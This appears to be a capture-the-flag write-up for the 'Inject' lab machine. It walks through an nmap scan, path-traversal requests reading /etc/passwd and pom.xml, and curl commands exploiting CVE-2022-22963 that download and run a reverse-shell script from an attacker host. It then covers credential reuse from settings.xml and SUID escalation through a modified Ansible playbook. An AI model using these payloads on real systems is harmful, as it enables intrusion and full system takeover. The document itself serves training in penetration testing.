## INject

```
Nmap scan report for 10.10.11.204
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

found upload in home page 


once uploaded we can see where the image is written on host



GET /show_image?img=image.png  


## Vulnerability

**LFI**


```html
GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.204:8080/upload
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Cache-Control: max-age=0
```


found a interesting file


```html
GET /show_image?img=../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.204:8080/upload
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Cache-Control: max-age=0

```

which reveals the spring version

```xml
<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-function-web</artifactId>
	<version>3.2.2</version>
</dependency>
```

https://github.com/Kirill89/CVE-2022-22963-PoC




header post request 




```bash
curl -X POST -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl IP/rev.sh -o /tmp/rev.sh")' -d sticazzi http://10.10.11.204:8080/functionRouter


curl -X POST -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev.sh")' -d sticazzi http://10.10.11.204:8080/functionRouter

```


## Pwned


once pwned we are frank ! 


in home we find a .m2 directory 

settings.xml gives us a phil passwd


```
	<username>phil</username>
	<password>DocPhillovestoInject123</password>

```



`su phil` give us the access on phil ! 


## Privilega Escalation



on /opt/automation/tasks/playbook_1.yml 


we can change it like this


#### Original

```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

```

#### Modified

```yml
- hosts: localhost
  tasks:
  - name: shell
    command: sudo chmod u+s /bin/bash
    ```


once uploaded 


`ansible-playbook my.yml`


and with /bin/bash -p 


we are **root**




















